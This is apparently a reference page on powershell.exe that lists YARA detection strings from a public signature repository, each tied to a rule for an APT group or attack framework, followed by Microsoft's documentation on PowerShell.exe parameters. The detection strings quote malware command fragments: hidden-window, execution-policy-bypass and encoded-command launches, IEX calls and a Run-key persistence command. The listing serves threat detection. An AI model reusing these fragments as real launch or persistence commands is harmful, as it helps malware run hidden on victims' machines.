[signature-base](https://github.com/Neo23x0/signature-base) | [apt_lazarus_dec17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_lazarus_dec17.yar) | $x1 = "$ProID = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_lazarus_dec17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_lazarus_dec17.yar) | $x5 = "/tr \"powershell.exe -ep bypass -windowstyle hidden -file " ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_magichound.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_magichound.yar) | $s1 = "powershell.exe " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_middle_east_talosreport.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_middle_east_talosreport.yar) | $x1 = "objWShell.Run \"powershell.exe -ExecutionPolicy Bypass -File \"\"%appdata%\"\"\\sys.ps1\", 0 " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_molerats_jul17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_molerats_jul17.yar) | $x1 = "powershell.exe -nop -c \"iex" nocase ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_ncsc_report_04_2018.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_ncsc_report_04_2018.yar) | $ = "powershell.exe" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar) | $x2 = "wss.Run \"powershell.exe \" & Chr(34) & \"& {waitfor haha /T 2}\" & Chr(34), 0" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar) | $x1 = "wss.Run \"powershell.exe \" & Chr(34) & \"& {(Get-Content $env:Public\\Libraries\\update.vbs) -replace '__',(Get-Random) \| Set-C" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar) | $x1 = "Powershell.exe -exec bypass -file ${global:$address1}" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_wilted_tulip.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_wilted_tulip.yar) | $x1 = "powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_empire.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_empire.yar) | $s2 = "$PowershellExe=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_metasploit_payloads.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_metasploit_payloads.yar) | $s1 = "powershell.exe -nop -w hidden -e" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_metasploit_payloads.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_metasploit_payloads.yar) | $x1 = "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_metasploit_payloads.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_metasploit_payloads.yar) | $s1 = ".ExpandEnvironmentStrings(\"%PSModulePath%\") + \"..\\powershell.exe\") Then" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_powershell_susp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar) | $p1 = "powershell.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_powershell_susp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar) | $s4 = "powershell.exe -w hidden -ep bypass -Enc" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_powershell_susp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar) | $s6 = "powershell.exe reg add HKCU\\software\\microsoft\\windows\\currentversion\\run" nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_powershell_susp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar) | $s1 = "POwErSHELl.ExE" fullword ascii nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_powershell_susp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar) | $x1 = "Process.Create(\"powershell.exe -nop -w hidden" fullword ascii nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_powershell_susp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar) | $x2 = ".Run\"powershell.exe -nop -w hidden -c \"\"IEX " ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_powershell_susp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar) | $x1 = ".Run \"powershell.exe -nop -w hidden -e " ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_powershell_susp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar) | $x2 = "FileExists(path + \"\\..\\powershell.exe\")" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_ps_empire_eval.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_ps_empire_eval.yar) | $s2 = "powershell.exe" ascii fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_winpayloads.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_winpayloads.yar) | $x4 = "powershell.exe -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAA" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_win_privesc.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_win_privesc.yar) | $x1 = "# powershell.exe -executionpolicy bypass -file folderperm.ps1" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_wmi_implant.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_wmi_implant.yar) | $x5 = "-Command 'powershell.exe -command \"Enable-PSRemoting" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s1 = "[*] Looks like we're 64bit, using regular powershell.exe" ascii wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## PowerShell

Windows PowerShell is a task-based command-line shell and scripting language designed especially for system administration. Built on the .NET Framework, Windows PowerShell helps IT professionals and power users control and automate the administration of the Windows operating system and applications that run on Windows.

### Using PowerShell.exe

The **PowerShell.exe** command-line tool starts a Windows PowerShell session in a Command Prompt window. When you use **PowerShell.exe**, you can use its optional parameters to customize the session. For example, you can start a session that uses a particular execution policy or one that excludes a Windows PowerShell profile. Otherwise, the session is the same as any session that is started in the Windows PowerShell console.

- To start a Windows PowerShell session in a Command Prompt window, type `PowerShell`. A **PS** prefix is added to the command prompt to indicate that you are in a Windows PowerShell session.

- To start a session with a particular execution policy, use the **ExecutionPolicy** parameter, and type:

    ```powershell
    PowerShell.exe -ExecutionPolicy Restricted
    ```

- To start a Windows PowerShell session without your Windows PowerShell profiles, use the **NoProfile** parameter, and type:

    ```powershell
    PowerShell.exe -NoProfile
    ```

- To start a session , use the **ExecutionPolicy** parameter, and type:

    ```powershell
    PowerShell.exe -ExecutionPolicy Restricted
    ```

- To see the PowerShell.exe help file, type:

    ```powershell
    PowerShell.exe -help
    PowerShell.exe -?
    PowerShell.exe /?
    ```

- To end a Windows PowerShell session in a Command Prompt window, type `exit`. The typical command prompt returns.

#### Remarks

- For a complete list of the **PowerShell.exe** command-line parameters, see [about_PowerShell.Exe](/powershell/module/microsoft.powershell.core/about/about_powershell_exe).

- For information about other ways to start Windows PowerShell, see [Starting Windows PowerShell](/powershell/scripting/windows-powershell/starting-windows-powershell).

- Windows PowerShell runs on the Server Core installation option of Windows Server operating systems. However, features that require a graphic user interface, such as the [Windows PowerShell Integrated Scripting Environment (ISE)](/previous-versions/hh849182(v=technet.10)), and the [Out-GridView](/powershell/module/microsoft.powershell.utility/out-gridview) and [Show-Command](/powershell/module/microsoft.powershell.utility/show-command) cmdlets, don't run on Server Core installations.

### Additional References

- [about_PowerShell.Exe](/powershell/module/microsoft.powershell.core/about/about_powershell_exe)

- [about_PowerShell_Ise.exe](/powershell/module/microsoft.powershell.core/about/about_powershell_ise_exe)

- [Windows PowerShell](/powershell/)

---



MIT License. Copyright (c) 2020 Strontic.


